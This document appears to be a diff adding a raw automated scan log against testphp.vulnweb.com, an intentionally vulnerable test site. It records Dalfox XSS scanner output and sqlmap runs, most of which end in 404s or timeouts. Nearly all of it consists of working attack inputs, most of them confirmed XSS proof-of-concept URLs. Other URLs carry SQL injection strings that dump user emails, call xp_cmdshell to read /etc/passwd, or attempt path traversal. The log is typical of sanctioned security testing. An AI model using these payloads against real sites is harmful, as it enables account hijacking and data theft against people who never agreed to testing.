@@ -1,0 +1,1515 @@
+[DALFOX] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=13
+[95m[POC][V][GET][inHTML-none(1)] http://testphp.vulnweb.com/listproducts.php?=&cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%281%29%3C%2Fscript%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%22%3Easd[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3Easd[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com%2Fproducts%2Fshop.php%3Fid%3D13%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1%2Cgroup_concat%28email%29%2C3+from+users%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%27%3E%3Ca+href%3D%27javascript%26colon%3Balert%281%29%27%3Eclick[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Caudio%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Faudio%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29+AND+6311%3D6311+AND+%28%27vgPb%27%3D%27vgPb%3E%3Cembed+src%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?p=valid
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%3E%3Csvg%3E%3Cuse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%3Csvg+id%3D%27x%27+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3D%27alert%281%29%27%3E%3C%2Fsvg%3E%23x%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%3E%3Cmeta+http-equiv%3Drefresh+content%3D0%3Burl%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?pp=" onmouseover="xss()" bad="
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?pp=%27%3E%3Csvg%3E%3Cset+onbegin%3Dalert%281%29+attributeName%3Dx+to%3D0%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%27%3E%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E&pp=[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?pp=%22%3E%3Cimg+src%3Dx+onerror%3D%22requestAnimationFrame%28%28%29%3D%3Ealert%281%29%29%22+class%3Ddalfox%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez&pp=[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Csvg%3E%3Cuse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%3Csvg+id%3D%27x%27+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3D%27alert%281%29%27%3E%3C%2Fsvg%3E%23x%3E&pp=[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cimg+src%3Dx+onerror%3D%22parent.alert%281%29%22+class%3Ddalfox%3E&pp=[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?lt;script=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3CIMG+SRC%3Dx+ondurationchange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?lt;/script=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Ca+href%3D%22javascript%26colon%3Balert%281%29%22%3Eclick[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Csvg+onload%3D%22frames%5B0%5D.alert%281%29%22+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?gt=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?gt=&p=%27%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?gt=&p=%22%3E%3CIMG+SRC%3Dx+onbeforeprint%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/listproducts.php?-=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?-=&cat=%3E%3Csvg%3E%3CanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?-=&cat=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B[0m
+
+
+[DALFOX] http://testphp.vulnweb.com:80/product.php?pic=5
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%27%3E%3Cmarquee+onstart%3Dalert%281%29%3E%3C%2Fmarquee%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%27%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com:80/product.php?pic=5%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+
+
+[GF+qsreplace] http://testphp.vulnweb.com/comment.php?aid=1A01
+http://testphp.vulnweb.com/comment.php?aid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+http://testphp.vulnweb.com/AJAX/infoartist.php?id=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/??id=1') AND 6602=8784 AND ('awZN'='awZN
+http://testphp.vulnweb.com/?%3Fid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com:80/comment.php?pid=4
+http://testphp.vulnweb.com:80/comment.php?pid=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/redir.php?view=itemlist
+http://testphp.vulnweb.com/redir.php?view=PAYLOAD
+
+[GF+qsreplace] http://testphp.vulnweb.com/redir.php?UID=118121
+http://testphp.vulnweb.com/redir.php?UID=PAYLOAD
+
+[DALFOX] http://testphp.vulnweb.com/listproducts.php?asdf=ff
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Csvg%3E%3CanimateMotion+onbegin%3Dalert%281%29+path%3DM20%2C20L20%2C50%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Csvg%2Fonload%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%27%3E%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E%3C%2Ftextarea%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?asdf=ff&cat=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/search.php?test=query=
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/search.php?test=query%3D%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/artists.php? artist=1-SLEEP(3)
+[95m[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/artists.php?+artist=1-SLEEP%283%29%3E%3Cmeta+http-equiv%3Drefresh+content%3D0%3Burl%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?YVeN=2411 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?LDeO=5891 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%22%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?fYij=6906 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?lt;iframe=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%22%3E%3CIMG+SRC%3Dx+onstorage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?DUMM=1329 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cembed+src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Clink+rel%3Ddns-prefetch+href%3D%2F%2Fevil.com+onload%3Dalert%281%29+class%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/listproducts.php?amp;asdf=ff
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%2F%2F%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/hpp/params.php?gt;=
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/hpp/params.php?p=%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F+class%3Ddalfox%3E%3C%2Fembed%3E[0m
+
+
+[DALFOX] http://testphp.vulnweb.com/AJAX/infoartist.php?uiDo=4470 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Csvg%3E%3CanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E[0m
+[95m[POC][R][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%27%22%3E%3Csvg%2Fonload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f[0m
+[95m[POC][V][GET][inHTML] http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3E%3Cbase+href%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%3E[0m
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?6169xU=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?r=https://www.harvard-edu.pp.ua
+
+[SQLI - detect] http://testphp.vulnweb.com/comment.php?aid=1A01
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:03:39 /2025-10-22/
+
+[06:03:39] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[06:03:39] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/comment.php?aid=1A01
+do you want to test this URL? [Y/n/q]
+> Y
+[06:03:39] [INFO] testing URL 'http://testphp.vulnweb.com/comment.php?aid=1A01'
+[06:03:39] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0603am.csv' as the CSV results file in multiple targets mode
+[06:03:39] [INFO] testing connection to the target URL
+[06:03:39] [CRITICAL] page not found (404)
+[06:03:39] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[06:03:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0603am.csv'
+
+[*] ending @ 06:03:39 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=13
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?G3zjyx=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?p=valid
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?pp=" onmouseover="xss()" bad="
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/index.php?user=1
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?RrHdLZ=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?mb9zbc=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?Q1xN8b=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/showimage.php?file='"-->%
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?12hBbm=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/?input=../etc/passwd
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?zfdfasdf=124fff...
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?nV9h5w=
+
+[SQLI - detect] http://testphp.vulnweb.com/search?q=aaa
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:48:41 /2025-10-22/
+
+[06:48:41] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[06:48:41] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/search?q=aaa
+do you want to test this URL? [Y/n/q]
+> Y
+[06:48:41] [INFO] testing URL 'http://testphp.vulnweb.com/search?q=aaa'
+[06:48:41] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0648am.csv' as the CSV results file in multiple targets mode
+[06:48:41] [INFO] testing connection to the target URL
+[06:48:41] [CRITICAL] page not found (404)
+[06:48:41] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[06:48:41] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0648am.csv'
+
+[*] ending @ 06:48:41 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/?cmd=\' OR \'1\'=\'1
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?lt;script=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?gt;alert(1)=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?lt;/script=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/hpp/params.php?gt=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?0VoC8K=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?cX9LIc=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/??id=1') AND 6602=8784 AND ('awZN'='awZN
+
+[SQLI - detect] http://testphp.vulnweb.com:80/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:12:42 /2025-10-22/
+
+[07:12:42] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[07:12:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[07:12:42] [INFO] skipping 'http://testphp.vulnweb.com:80/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000'
+
+[*] ending @ 07:12:42 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/index.php?%id%=1'GWsMmx<'">zgMYBb
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/showimage.php?ﬁle=./pictures/1.jpg
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/showimage.php?size=160
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?Kwfmpu=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?Zcvvuw=
+
+[SQLI - detect] http://testphp.vulnweb.com:80/comment.php?pid=4
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:27:43 /2025-10-22/
+
+[07:27:43] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
